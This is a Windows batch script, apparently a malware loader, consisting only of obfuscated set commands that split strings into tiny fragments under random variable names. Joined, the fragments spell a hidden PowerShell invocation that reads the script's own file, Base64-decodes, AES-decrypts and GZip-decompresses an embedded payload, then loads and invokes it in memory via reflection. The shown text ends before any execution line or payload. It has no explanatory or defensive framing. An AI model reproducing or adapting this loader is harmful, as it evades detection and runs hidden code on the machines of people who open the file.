@echo off
set "NSizXiRDPw=32"
set "ZarQymOUkl=we"
set "icyZJelFZS=ll"
set "brAVjdzAnw=1."
set "wHcwbvNcoZ=s\"
set "vDMEpmyUfo=Wi"
set "vFWETjrtJE=0\"
set "wVysrzHFZR=y "
set "NwluqTAkTh=xe"
set "hEutAnUwbn=po"
set "TsdUPbrmqu=ws"
set "LRyGOowyeZ=:\"
set "EBiLsTggwx=py"
set "jWXbReSwBm=em"
set "suQqBSamwC=ll"
set "nxceQonzOF=\v"
set "ZgSdeQYVXn=Sy"
set "MUTDIBVwyW=nd"
set "NhEKLwHUMq=\W"
set "YBtKzzRAkB=do"
set "saZhKLWTrC=st"
set "zULLPcjRmZ=in"
set "pxmkkGFumT=.e"
set "pKHTnMcCXe=ow"
set "bCZKtqIZKZ=co"
set "NrurFaUUgy=we"
set "WTQjyxXguV=he"
set "LWBRCbQiXG=he"
set "ZAHDlxaYrQ= C"
set "EhJkwhRQWO=rS"
set "dNzlqqbZqc= /"
set "tAZZhHAxlG=rs"
set "wXKlNShwJU=Po"
set "pDKaJpomqH= %~dp0"
set "OKAoHaZqvI=cd"
set "GBBQLLulFT=.Key"
set "lXrRjIefQz=y]::"
set "MNKLxSlIQW=('%~f0'"
set "EeTgwVYjZD=Obje"
set "egwGYaRpqz=ress"
set "deHufFQJAu=lit("
set "ySwAUhwoml=Disp"
set "akvJnwSpem= = N"
set "puIMJZkhCo=Gxh "
set "XxXeCsaHhI='[-1"
set "FxhPEYslcW=wBj "
set "tneSlSmePx=.Cop"
set "fmAcRpPIqz=UGTu"
set "ttUOPgofMv=and "
set "KDGfFPsXmB=ion."
set "GmEiYgxFjf=ode]"
set "WdVTvuUbbg= '')"
set "SdJomghGpM=ke($"
set "VdpWzBAhAv=Y.Pa"
set "zOWeDPKjYZ=oP, "
set "ShlKKqEPLa=ck($"
set "nYIRwTFqRD=Comp"
set "heowcsGmGp= '')"
set "fCODACUZGu=B = "
set "DMgvvhlBQD=yTo("
set "iutXTUFHWb=[Sys"
set "XUwuWIsbRN=embl"
set "trqVSRcBaC== $C"
set "IGiGnZjQKm=Comp"
set "CDcbxgcaei=pDZz"
set "lYhyRLKBWP=mory"
set "huhxhIYbJt= New"
set "pPvjADwJTy=Bmor"
set "RaIeRuDMcY=);$S"
set "PTnTSHAWzc=..-1"
set "ijZSDJsBLl=sion"
set "KwfDijqJYw=am;$"
set "aaloqqqqEq=eytM"
set "MYsaefCBHX=null"
set "ChEedMbjND=tS46"
set "WdHnctKSSQ=XlwY"
set "xdNDJoeBek=morF"
set "MzGzpMoRAL=Conv"
set "bINTKhMvei=esaB"
set "cKXfZbCFnE=gnir"
set "zECpjzbjaI=F'[-"
set "bXjyLVeoBT=);$C"
set "vZZidNesRP=m(, "
set "yFElkSUEEx=m.IO"
set "vVFthmOASx=iron"
set "IzeCGDLIrr=join"
set "BmPZuqsozr=Syst"
set "TCsPsQwMHB=pose"
set "SjWBqlblUl=t Sy"
set "QBkmlmtxgc=]::("
set "ncsbfrjUTF=eCxE"
set "bSjVTGEvpe=join"
set "QPxfBsNqsN=.Dis"
set "FrmxcqHoRl=tem."
set "QMahIzvnCw=)($q"
set "yraxWuFVTn=esFX"
set "BvqJTVTeRM=B = "
set "ZDZlXAtxri=ptog"
set "MJcRnuzdLV=y.Pa"
set "LwfoNaBZow=brea"
set "RhugwHtSGQ=3HWs"
set "BsUQBZblNk=; };"
set "igoFchgGAZ=saBm"
set "nTpJMhcitY=rans"
set "tzHyUXBvdu=$qpE"
set "ryiwNGCSUN=] -j"
set "JRMTAegzfp=();$"
set "tbYialGyFz=);$e"
set "HyVvvHUJxb= [Sy"
set "WUZfGyKOBV=le  "
set "CYzkpmXiDT=esMa"
set "jNaYyKOERB=MB);"
set "hJYwpRmtpq=yste"
set "OVwYsYmLHi=.IO."
set "JwlLqdMtbm=yste"
set "UcMpoNWEVU=j.Su"
set "ezIdONaYdD=d;$C"
set "pkuYgffJQH=)) {"
set "dlCipQamvf=1..-"
set "XJouaXJral=).Sp"
set "vdvIBxmMew=XlwY"
set "TCptXuorNO=ress"
set "bFPoZRwMIu=;$fH"
set "bgSmowCOtP=CxET"
set "huOOdrTtJG=tem."
set "QGhLdwIEGZ=Star"
set "hNWODnfrxL=P = "
set "TeJOPDdiQq=:('g"
set "DXUBNyoDeG=6esa"
set "KVEDQjkEUa=tryP"
set "cPRSiDgXKP== [S"
set "mhndLPDzLC=;$fH"
set "fdmUHaJRPe=y.Cr"
set "zdfCAdJwLC=$Qwj"
set "czSXZlaUET=oArr"
set "XQiXkKYcnA=.Cry"
set "quhigGREEt=Iz ="
set "clzqRGRQxh=g = "
set "xwzgSBvWDx=zJ.T"
set "aOxmihiNfr=ss -"
set "sMsnHdobCL=0O+g"
set "NUOjEUBKZw='gni"
set "sOunwvlojf=.GZi"
set "jbJCnYOaYn=($La"
set "CxDkOcUQrI=m.IO"
set "kHbWGKEYeS=Secu"
set "FkgfCLpAgB=yste"
set "ciSMPzVzXP=-nop"
set "GzEHUEbqAR=ptor"
set "pWMVensZKa=ct S"
set "bpMvxOWZml=PKCS"
set "NmmYoRChLp=;$Nh"
set "IffDqqDDad=stem"
set "viboNjDIVk=TllA"
set "SvWAEamDEg=ose("
set "EOEFYImANc='[-1"
set "xVqotzQGAX=Stre"
set "ZSczAcwRSf=oint"
set "xmTkDVPMdh=wjyp"
set "lHwUKvbTIe==');"
set "cPVEQPJCvy=S46e"
set "oWrTUAOPXv=.Mem"
set "GOJrvIELMG=bstr"
set "xeDvCdnnUJ=n ''"
set "uoXkpeeutq=ay()"
set "XVFRVCUYzQ=:: '"
set "euxtRmLIDu=B, 0"
set "nmhojhyguc=XlwY"
set "OkqJfXSRCA=LawB"
set "nJyurBujqd=qpEM"
set "MBmVJiUsAM=-joi"
set "hRdMZMLeMi=($La"
